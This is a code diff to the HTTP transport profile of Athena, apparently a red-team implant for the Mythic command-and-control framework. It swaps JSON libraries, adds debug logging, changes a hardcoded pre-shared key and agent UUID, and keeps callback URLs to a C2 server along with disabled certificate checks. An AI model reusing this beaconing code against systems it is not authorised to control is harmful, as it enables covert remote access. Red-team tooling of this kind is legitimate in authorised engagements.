@@ -1,8 +1,10 @@
 ﻿using Athena.Models.Config;
 using Athena.Utilities;
-using Newtonsoft.Json;
+//
+using System.Text.Json;
 using System.Net;
 using System.Net.Security;
+using Athena.Models.Mythic.Checkin;
 
 namespace Athena
 {
@@ -52,11 +54,11 @@ namespace Athena
             this.hostHeader = "";
             this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}=";
             this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
-            this.proxyHost = "http://127.0.0.1:8080";
+            this.proxyHost = "";
             this.proxyPass = "";
             this.proxyUser = "";
-            this.psk = "FuG4oYroFMRzEcMgjULEJGt+XNbU/LH5TTgBVqjBgCw=";
-            this.uuid = "80acafd9-6caf-43c9-917d-1a040b9d1030";
+            this.psk = "eMO9NvNaCCPh8na73WYu0C773inV2ULIdiSV7qFchI8=";
+            this.uuid = "a752d5c9-4d38-4507-a9a7-3953b5774c40";
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
                    new RemoteCertificateValidationCallback(
@@ -101,11 +103,12 @@ namespace Athena
             }
 
         }
-        public async Task<string> Send(object obj)
+        public async Task<string> Send(string json)
         {
             try
             {
-                string json = JsonConvert.SerializeObject(obj);
+                //string json = JsonSerializer.Serialize(obj, CheckinJsonContext.Default.Checkin);
+                Console.WriteLine(json);
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -125,22 +128,22 @@ namespace Athena
                     response = await this.client.PostAsync(this.postURL, new StringContent(json));
                 }
 
-                json = await response.Content.ReadAsStringAsync();
+                string strRes = await response.Content.ReadAsStringAsync();
 
                 if (this.encrypted)
                 {
-                    return this.crypt.Decrypt(json);
+                    return this.crypt.Decrypt(strRes);
                 }
 
-                if (!string.IsNullOrEmpty(json))
+                if (!string.IsNullOrEmpty(strRes))
                 {
-                    return (await Misc.Base64Decode(json)).Substring(36);
+                    return (await Misc.Base64Decode(strRes)).Substring(36);
                 }
-
                 return String.Empty;
             }
-            catch
+            catch (Exception e)
             {
+                Console.WriteLine(e);
                 return String.Empty;
             }
         }
